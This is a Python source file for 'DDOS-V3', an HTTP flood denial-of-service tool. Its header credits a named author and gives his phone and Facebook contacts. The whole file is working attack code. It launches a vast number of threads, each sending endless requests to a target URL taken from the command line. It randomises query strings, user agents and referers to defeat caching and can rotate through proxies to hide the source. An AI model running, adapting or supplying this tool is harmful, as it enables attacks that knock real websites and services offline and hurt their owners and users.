"""
    CopyRight 2022 @Nguyễn Phú Khương
    Bản Quyền Bởi Nguyễn Phú Khương
    Zalo : 0363561629
    Facebook : Nguyễn Phú Khương(fb.com/nguyen.phu.khuong0709)
"""

import urllib.request
import sys
import threading
import random
import re
import os
import json
from colorama import Fore

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

with open("setting.ddos-v3.json","r",encoding="utf-8") as f:
	cfg = json.load(f)
with open(cfg['useragent'],"r",encoding="utf-8") as f:
	list_useragent = f.readlines()
with open(cfg['referer'],"r",encoding="utf-8") as f:
	list_referers = f.readlines()
with open(cfg['proxies'],"r",encoding="utf-8") as f:
	list_proxies = f.readlines()

class DAT:
	useragent = list_useragent
	referer = list_referers
	proxy = list_proxies
	url = ""
	host = ""

dat = DAT()

def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)


def HTTPRunProxy():
	url = dat.url
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	urls = str(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request = urllib.request.Request(urls)
	request.add_header('User-Agent', random.choice(dat.useragent).strip())
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(dat.referer).strip() + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
		proxies = random.choice(dat.proxy).strip()
		proxy_support = urllib.request.ProxyHandler({'http': f"http://{proxies}", 'https': f"http://{proxies}"})
		opener = urllib.request.build_opener(proxy_support)
		urllib.request.install_opener(opener)
	except:pass
	
	try:
			with urllib.request.urlopen(request,timeout=5) as r:
				return "200",proxies,urls
	except:
			return "400",proxies,urls


class HTTPThreadProxy(threading.Thread):
	def run(self):
		try:
			for _ in range(999999999):
				code , proxies, urls = HTTPRunProxy()
				proxy = proxies.split("@")[1]
				if code == "200":
					print(Fore.GREEN + f"{code} | {proxy} | {urls}")
				else:
					print(Fore.RED + f"{code} | {proxy} | {urls}")
		except:
			pass
def HTTPRunNoproxy():
	url = dat.url
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	urls = str(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request = urllib.request.Request(urls)
	request.add_header('User-Agent', random.choice(dat.useragent).strip())
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(dat.referer).strip() + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			with urllib.request.urlopen(request,timeout=5) as r:
				return "200",urls
	except:
			return "400",urls


class HTTPThreadNoproxy(threading.Thread):
	def run(self):
		try:
			for _ in range(999999999):
				code, urls = HTTPRunNoproxy()
				if code == "200":
					print(Fore.GREEN + f"{code} | {urls}")
				else:
					print(Fore.RED + f"{code} | {urls}")
		except:
			pass


try:
	url = sys.argv[1]
except:
	url = sys.argv[0]
	
os.system("cls")
os.system("color 2")
print (f"        ---    DDOS-V3     ---\n        -- Nguyễn Phú Khương -- \n         Starting-> {url}\n-----------------------------------------------------------")
if url.count("/")==2:
	url = url + "/"
m = re.search('(https?\://)?([^/]*)/?.*', url)
host = m.group(2)
dat.host = host
dat.url = url
if cfg['isproxy'] == True:
	for i in range(99999999):
		t = HTTPThreadProxy()
		t.start()
else:
	for i in range(99999999):
		t = HTTPThreadNoproxy()
		t.start()